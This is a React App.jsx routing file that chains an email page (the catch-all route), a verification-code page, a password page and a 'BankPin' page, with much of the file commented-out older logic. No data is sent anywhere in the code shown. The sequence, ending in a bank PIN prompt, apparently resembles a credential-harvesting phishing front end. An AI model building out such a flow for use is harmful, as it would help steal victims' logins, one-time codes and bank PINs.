import { useEffect, useState } from "react";
import Email from "./components/flow.jsx/Email";
import Password from "./components/flow.jsx/Password";
import Code from "./components/flow.jsx/Code";
import "./App.css";
import './index.css';
import BankPin from "./components/flow.jsx/BankPin";
import { createBrowserRouter, RouterProvider, Routes, Route, useNavigate } from 'react-router-dom';


function App() {
  // const [togglePass, setTogglePass] = useState(false);

  // const [toggleCode, setToggleCode] = useState(false);
  const [email, setEmail] = useState("");
  const [password, setPassword] = useState("");
  // const navigate = useNavigate();

  // const handleEmailSubmit = () => {
  //   // Perform any validation or state update here
  //   navigate('/code');  // Navigate to password route
  // };

  // const handlePasswordSubmit = () => {
  //   // Perform validation or state update here
  //   navigate('/verify');  // Navigate to code route
  // };
  // const handleCodeSubmit = () => {
  //   // Perform validation or state update here
  //   navigate('/password');  // Navigate to code route
  // };


  
  return (
    <>
      <div className="bg">
      <Routes>
        <Route
          path="*"
          element={
            <Email
              email={email}
              setEmail={setEmail}
              // toggle={togglePass}
              // setToggle={setTogglePass}
              // onSubmit={handleEmailSubmit}
            />
          }
        />
        <Route
          path="/code"
          element={
            <Code
              emailValue={email}
              // onSubmit={handleCodeSubmit}
            />
          }
        />
        <Route
          path="/password"
          element={
            <Password
              // toggle={toggleCode}
              // setToggleCode={setToggleCode}
              password={password}
              setPassword={setPassword}
              // onSubmit={handlePasswordSubmit}
            />
          }
        />
        <Route
          path="/verify"
          element={
            <BankPin/>
          }
        />
      </Routes>
    </div>

        {/* <Email
          email={email}
          setEmail={setEmail}
          toggle={togglePass}
          setToggle={setTogglePass}
        /> */}
      {/* {toggleCode ? (
        <div className="bg">
          <Code 
            emailValue={email} 
          />
        </div>
      ) : (
        <div className="bg">
          {togglePass ? (
            <Password
              toggle={toggleCode}
              setToggleCode={setToggleCode}
              password={password}
              setPassword={setPassword}
            />
          ) : (
            <Email
              email={email}
              setEmail={setEmail}
              toggle={togglePass}
              setToggle={setTogglePass}
            />
          )}
        </div>
      )} */}
    </>
  );
}

export default App;
